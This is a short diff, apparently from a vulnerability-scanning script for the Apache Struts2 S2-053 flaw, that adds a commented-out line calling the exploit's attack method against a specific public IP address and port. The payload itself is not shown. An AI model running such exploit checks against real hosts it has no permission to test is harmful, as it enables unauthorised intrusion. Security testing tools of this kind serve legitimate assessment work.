@@ -26,3 +26,5 @@ class Exploit:
                 return "struts2_053"
         except requests.ConnectionError as e:
             return None
+
+#print(Exploit().attack('http://207.246.73.172:82/'))
